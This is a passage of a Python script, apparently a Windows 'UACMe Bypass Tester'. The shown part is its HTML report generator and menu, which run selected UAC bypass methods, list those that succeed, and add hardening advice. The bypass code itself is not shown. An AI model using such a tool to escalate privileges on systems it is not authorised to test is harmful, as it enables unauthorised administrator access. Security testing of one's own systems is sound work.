        """Generate HTML report"""
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>UACMe Bypass Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 15px; }}
        h2 {{ color: #555; margin-top: 30px; padding-bottom: 10px; border-bottom: 1px solid #ddd; }}
        .summary {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; margin: 20px 0; }}
        .success {{ color: #4CAF50; font-weight: bold; }}
        .failed {{ color: #f44336; font-weight: bold; }}
        .method-card {{ background: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin: 10px 0; }}
        .method-success {{ border-left: 5px solid #4CAF50; }}
        .method-failed {{ border-left: 5px solid #f44336; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #4CAF50; color: white; }}
        .status-badge {{ padding: 4px 8px; border-radius: 4px; font-size: 0.9em; font-weight: bold; }}
        .badge-success {{ background-color: #4CAF50; color: white; }}
        .badge-failed {{ background-color: #f44336; color: white; }}
        .system-info {{ background: #e8f4f8; padding: 15px; border-radius: 5px; margin: 20px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>UACMe Bypass Test Report</h1>
        <div style="color: #666; margin-bottom: 20px;">
            Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | 
            Based on: <a href="https://github.com/hfiref0x/UACME" target="_blank">UACMe Project</a>
        </div>
        
        <div class="system-info">
            <h2>System Information</h2>
            <table>
                <tr><td><strong>Operating System:</strong></td><td>{report_data['system_info']['system']} {report_data['system_info']['release']}</td></tr>
                <tr><td><strong>Build Number:</strong></td><td>{report_data['system_info']['windows_build']}</td></tr>
                <tr><td><strong>Architecture:</strong></td><td>{report_data['system_info']['architecture']}</td></tr>
                <tr><td><strong>Python Version:</strong></td><td>{report_data['system_info']['python_version']}</td></tr>
                <tr><td><strong>Admin Privileges:</strong></td><td>{'Yes' if report_data['system_info']['is_admin'] else 'No'}</td></tr>
            </table>
        </div>
        
        <div class="summary">
            <h2>Test Summary</h2>
            <div style="display: flex; justify-content: space-around; text-align: center;">
                <div>
                    <div style="font-size: 2.5em; font-weight: bold;">{report_data['summary']['total_tests']}</div>
                    <div>Total Tests</div>
                </div>
                <div>
                    <div style="font-size: 2.5em; font-weight: bold;" class="success">{report_data['summary']['successful']}</div>
                    <div>Successful</div>
                </div>
                <div>
                    <div style="font-size: 2.5em; font-weight: bold;" class="failed">{report_data['summary']['failed']}</div>
                    <div>Failed</div>
                </div>
                <div>
                    <div style="font-size: 2.5em; font-weight: bold;">{report_data['summary']['success_rate']:.1f}%</div>
                    <div>Success Rate</div>
                </div>
            </div>
        </div>
        
        <h2>Test Results</h2>
'''
        
        # Add results table
        html += '''
        <table>
            <tr>
                <th>Method ID</th>
                <th>Method Name</th>
                <th>Type</th>
                <th>Target</th>
                <th>Status</th>
                <th>Details</th>
            </tr>
'''
        
        for result in report_data['results']:
            method_info = UACME_METHODS.get(result['method_id'], {})
            status_class = 'badge-success' if result['success'] else 'badge-failed'
            status_text = 'SUCCESS' if result['success'] else 'FAILED'
            
            html += f'''
            <tr>
                <td>{result['method_id']}</td>
                <td><strong>{result['method_name']}</strong></td>
                <td>{method_info.get('type', 'Unknown')}</td>
                <td>{method_info.get('target', 'Unknown')}</td>
                <td><span class="status-badge {status_class}">{status_text}</span></td>
                <td>{result['details']}</td>
            </tr>
'''
        
        html += '''
        </table>
        
        <h2>Recommendations</h2>
        <div class="method-card">
'''
        
        if report_data['summary']['successful'] > 0:
            html += '''
            <p><strong>Effective Methods Found:</strong></p>
            <ul>
'''
            for result in report_data['results']:
                if result['success']:
                    method_info = UACME_METHODS.get(result['method_id'], {})
                    html += f'<li><strong>Method {result["method_id"]}</strong>: {result["method_name"]} - Works on this system</li>\n'
            
            html += '''
            </ul>
            <p><strong>Security Recommendations:</strong></p>
            <ul>
                <li>Keep Windows updated to patch known UAC bypass methods</li>
                <li>Consider setting UAC to highest level for sensitive systems</li>
                <li>Monitor registry changes in HKCU\\Software\\Classes\\ keys</li>
                <li>Use application control policies where possible</li>
            </ul>
'''
        else:
            html += '''
            <p>No successful UAC bypass methods were found on this system.</p>
            <p>This could indicate:</p>
            <ul>
                <li>System is fully patched against tested methods</li>
                <li>UAC is configured at highest security level</li>
                <li>Some methods may require specific conditions not met</li>
            </ul>
'''
        
        html += '''
        </div>
        
        <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; text-align: center;">
            <p><em>Report generated by UACMe Bypass Tester v2.0 | Educational Use Only</em></p>
            <p>Reference: <a href="https://github.com/hfiref0x/UACME" target="_blank">UACMe GitHub Repository</a></p>
        </footer>
    </div>
</body>
</html>
'''
        
        with open(output_file, 'w') as f:
            f.write(html)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main function"""
    print("UACMe Bypass Method Tester - Extended Edition")
    print("=============================================")
    print("Based on: https://github.com/hfiref0x/UACME")
    print("")
    print("This tool tests various UAC bypass methods documented in the UACMe project.")
    print("WARNING: This is for educational and testing purposes only.")
    print("")
    
    if not WINDOWS_AVAILABLE:
        print("❌ This tool requires Windows operating system.")
        return
    
    # Check for required modules
    missing_modules = []
    required_windows_modules = ['winreg', 'win32api', 'win32com.client']
    
    for module in required_windows_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print("⚠️  Missing Windows modules. Some tests may not work properly.")
        print(f"   Missing: {', '.join(missing_modules)}")
        print("   Install with: pip install pywin32")
        print("")
    
    print("Available UACMe methods to test:")
    print("-" * 40)
    for method_id, info in UACME_METHODS.items():
        if info.get('status') == 'current':
            print(f"  Method {method_id}: {info['name']}")
            print(f"     Type: {info['type']}, Target: {info['target']}")
    
    print("\n" + "="*80)
    print("Select testing mode:")
    print("1. Test all current methods")
    print("2. Test specific method(s)")
    print("3. Cancel")
    print("4. Audit registry and policies")
    
    choice = input("\nEnter choice (1-4): ").strip()
    
    if choice == '3':
        print("Test cancelled.")
        return
    if choice == '4':
        tester = ExtendedUACTester(verbose=True)
        report = tester.run_audit()
        print("\n" + "="*80)
        print("AUDIT COMPLETE")
        print("="*80)
        return
    
    print("\n" + "="*80)
    print("Starting tests...")
    print("NOTE: Some tests may trigger UAC prompts or security warnings.")
    print("Press Ctrl+C to cancel at any time.")
    print("="*80)
    
    time.sleep(2)
    
    # Create tester
    tester = ExtendedUACTester(verbose=True)
    
    # Run tests based on choice
    if choice == '1':
        # Test all current methods
        current_methods = [mid for mid, info in UACME_METHODS.items() 
                          if info.get('status') == 'current']
        report = tester.run_all_tests(current_methods)
    elif choice == '2':
        # Test specific methods
        method_input = input("\nEnter method IDs to test (comma-separated, e.g., 25,33,41): ").strip()
        try:
            method_ids = [int(mid.strip()) for mid in method_input.split(',')]
            valid_methods = [mid for mid in method_ids if mid in UACME_METHODS]
            
            if not valid_methods:
                print("No valid method IDs entered.")
                return
            
            report = tester.run_all_tests(valid_methods)
        except ValueError:
            print("Invalid input. Please enter numeric method IDs.")
            return
    
    print("\n" + "="*80)
    print("TESTING COMPLETE")
    print("="*80)
    print("Check the generated reports for detailed results.")
    print("Remember: UAC bypass methods vary in effectiveness across Windows versions.")
    print("="*80)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest cancelled by user.")
    except Exception as e:
        print(f"\n\nUnexpected error: {e}")
